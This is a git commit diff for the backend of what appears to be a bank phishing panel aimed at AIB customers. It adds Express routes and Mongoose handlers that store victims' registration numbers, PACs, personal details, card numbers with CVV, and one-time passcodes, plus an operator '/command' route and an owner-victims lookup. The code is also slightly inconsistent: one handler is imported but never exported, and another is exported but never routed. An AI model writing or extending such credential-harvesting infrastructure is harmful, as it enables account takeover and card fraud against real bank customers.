c3b5193a3b0ba2a6e1a41213473a9a735cf94221
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-11-01 14:26:47 +0000

    make

--- controllers/aibController.js
+++ controllers/aibController.js
@@ -15,7 +15,7 @@ const getOwnerVics = async (req, res) => {
 const command = async (req, res) => {
   const { uniqueid, status } = req.body;
   try {
-    AIB.findOneAndUpdate({ uniqueid }, { status }).exec();
+    await AIB.findOneAndUpdate({ uniqueid }, { status }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -35,9 +35,92 @@ const getInfo = async (req, res) => {
   });
 };
 
+const submitLogin = async (req, res) => {
+  const { regnumber, pac, uniqueid } = req.body;
+  try {
+    await AIB.create({ uniqueid, regnumber, pac });
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitLoginAgain = async (req, res) => {
+  const { regnumber, pac, uniqueid } = req.body;
+  try {
+    await AIB.findOneAndUpdate(
+      { uniqueid },
+      { regnumber, pac, status: 10 }
+    ).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitPersonal = async (req, res) => {
+  const { fullname, address, pcode, dob, telephone, uniqueid } = req.body;
+  try {
+    await AIB.findOneAndUpdate(
+      { uniqueid },
+      { fullname, address, pcode, dob, telephone, status: 3 }
+    ).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitCard = async (req, res) => {
+  const { ccnum, ccexp, cvv, uniqueid } = req.body;
+  try {
+    await AIB.findOneAndUpdate(
+      { uniqueid },
+      { ccnum, ccexp, cvv, status: 5 }
+    ).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitOtp = async (req, res) => {
+  const { otp, uniqueid } = req.body;
+  try {
+    await AIB.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitMisc = async (req, res) => {
+  const { cardNumber, branchAddy, uniqueid } = req.body;
+  try {
+    await AIB.findOneAndUpdate(
+      { uniqueid },
+      { cardNumber, branchAddy, status: 9 }
+    ).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
 module.exports = {
   openModal,
   getOwnerVics,
   command,
   getInfo,
+  submitLogin,
+  submitPersonal,
+  submitCard,
+  submitOtp,
+  submitMisc,
 };
--- routes/aib.js
+++ routes/aib.js
@@ -1,8 +1,26 @@
 const express = require("express");
-const { openModal } = require("../controllers/aibController");
+const {
+  openModal,
+  getOwnerVics,
+  command,
+  getInfo,
+  submitLogin,
+  submitPersonal,
+  submitOtp,
+  submitMisc,
+  submitLoginAgain,
+} = require("../controllers/aibController");
 
 const router = express.Router();
 
 router.post("/customers/:id/:owner/modal", openModal);
+router.post("/customers/:owner", getOwnerVics);
+router.post("/command", command);
+router.post("/customers/id/:id", getInfo);
+router.post("/login", submitLogin);
+router.post("/loginAgain", submitLoginAgain);
+router.post("/personal", submitPersonal);
+router.post("/otp", submitOtp);
+router.post("/misc", submitMisc);
 
 module.exports = router;
